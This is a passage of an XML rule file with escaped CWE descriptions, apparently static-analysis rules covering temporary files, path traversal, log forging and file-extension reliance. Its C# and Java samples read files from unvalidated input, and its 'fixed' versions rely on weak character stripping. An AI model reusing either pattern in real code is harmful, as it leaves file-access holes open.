valign="top"&gt;743&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=743" target="_blank"&gt;CERT C Secure Coding Section 09 - Input Output (FIO)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;734&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_379_Taxonomy Mappings" id="oc_379_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Guessed or visible temporary file&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;FIO15-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Ensure that file operations are performed in a secure
directory&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;FIO43-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Do not create temporary files in shared
directories&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_379_Content History" id="oc_379_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Name&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Other Notes,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Guessed or Visible Temporary
File&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Creation of Temporary File in
Directory with Insecure Permissions&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1583</key><name>Stored_Relative_Path_Traversal</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could define any arbitrary file path for the application to use, potentially leading to:&lt;/div&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;Stealing sensitive files, such as configuration or system files&lt;/li&gt;
&lt;li&gt;Overwriting files such as program binaries, configuration files, or system files&lt;/li&gt;
&lt;li&gt;Deleting critical files, causing a denial of service (DoS).&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses user input in the file path for accessing files on the application server&amp;#8217;s local disk. This enables an attacker to arbitrarily determine the file path.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, avoid depending on user input for file selection.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Accept user input only for the filename, not for the path and folders.&lt;/li&gt;
&lt;li&gt;Ensure that file path is fully canonicalized.&lt;/li&gt;
&lt;li&gt;Explicitly limit the application to using a designated folder that separate from the applications binary folder.&lt;/li&gt;
&lt;li&gt;Restrict the privileges of the application&amp;#8217;s OS user to necessary files and folders. The application should not be able to write to the application binary folder, and should not read anything outside of the application folder and data folder.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class PathTraversal
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text;
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters are removed from the user input before use
      &lt;/h4&gt;&lt;pre&gt;public class PathTraversalFixed
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text.Replace("\", "").Replace("..", "");
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;h4&gt;Potentially hazardous characters are removed from the user input before use&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal_Fixed {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        name = name.replace("/", "").replace("..", "");
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_609</key><name>Log_Forging</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could engineer audit logs of security-sensitive actions and lay a false audit trail, potentially implicating an innocent user or hiding an incident.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application writes audit logs upon security-sensitive actions. Since the audit log includes user input that is neither checked for data type validity nor subsequently sanitized, the input could contain false information made to look like legitimate audit log data,&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Validation is not a replacement for encoding. Fully encode all dynamic data, regardless of source, before embedding it in logs.&lt;/li&gt;
&lt;li&gt;Use a secure logging mechanism.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Objc&lt;/h3&gt;&lt;h4&gt;Ensure you encode any special delimiter characters before writing to a log file.&lt;/h4&gt;&lt;pre&gt;


NSLog(@"%@", [logDetails stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"]);


&lt;/pre&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Ensure you encode any special delimiter characters before writing to a log file.

      &lt;/h4&gt;&lt;pre&gt;


Log.Write( logDetails.Replace(CRLF, @"\CRLF"));



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Ensure you encode any special delimiter characters before writing to a log file.

      &lt;/h4&gt;&lt;pre&gt;


Log.Write( logDetails.Replace(CRLF, @"\CRLF"));


      &lt;/pre&gt;&lt;h3&gt;Swift&lt;/h3&gt;&lt;h4&gt;Ensure you encode any special delimiter characters before writing to a log file.&lt;/h4&gt;&lt;pre&gt;


print(logDetails.stringByReplacingOccurrencesOfString("\n", withString: "\\n"))


&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2696</key><name>Stored_Boundary_Violation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Reliance on File Name or Extension of Externally-Supplied File&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;646&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_646_Description" id="oc_646_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software allows a file to be uploaded, but it relies on the
file name or extension of the file to determine the appropriate behaviors. This
could be used by attackers to cause the file to be misclassified and processed
in a dangerous fashion.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;An application might use the file name or extension of of a user-supplied
file to determine the proper course of action, such as selecting the correct
process to which control should be passed, deciding what data should be made
available, or what resources should be allocated. If the attacker can cause
the code to misclassify the supplied file, then the wrong action could
occur. For example, an attacker could supply a file that ends in a
".php.gif" extension that appears to be a GIF image, but would be processed
as PHP code. In extreme cases, code execution is possible, but the attacker
could also cause exhaustion of resources, denial of service, information
disclosure of debug or system data (including application source code), or
being bound to a particular server side process. This weakness may be due to
a vulnerability in any of the technologies used by the web and application
servers, due to misconfiguration, or resultant from another flaw in the
application itself.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_646_Time of Introduction" id="oc_646_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_646_Applicable Platforms" id="oc_646_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_646_Common Consequences" id="oc_646_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Information Leakage&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Denial of Service&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Access Control&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Privilege Escalation&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_646_Likelihood of Exploit" id="oc_646_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Enabling Factors for Exploitation"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Enabling Factors for Exploitation&lt;/div&gt;&lt;div name="oc_646_Enabling Factors for Exploitation" id="oc_646_Enabling Factors for Exploitation" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;There is reliance on file name and/or file extension on the server side
for processing.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_646_Potential Mitigations" id="oc_646_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Make decisions on the server side based on file content and not on
file name or extension.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Properly configure web and applications servers.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Install the latest security patches for all of the technologies being
used on the server side.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_646_Relationships" id="oc_646_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;345&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=345" target="_blank"&gt;Insufficient Verification of Data Authenticity&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;442&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=442" target="_blank"&gt;Web Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_646_Related Attack Patterns" id="oc_646_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org209.html" target="_blank"&gt;209&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Cross-Site Scripting Using MIME Type Mismatch&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_646_Content History" id="oc_646_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-01-30&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Evgeny Lebanidze&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External Submission&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Relationships,
Observed Example&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-13&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Significant clarification of the weakness
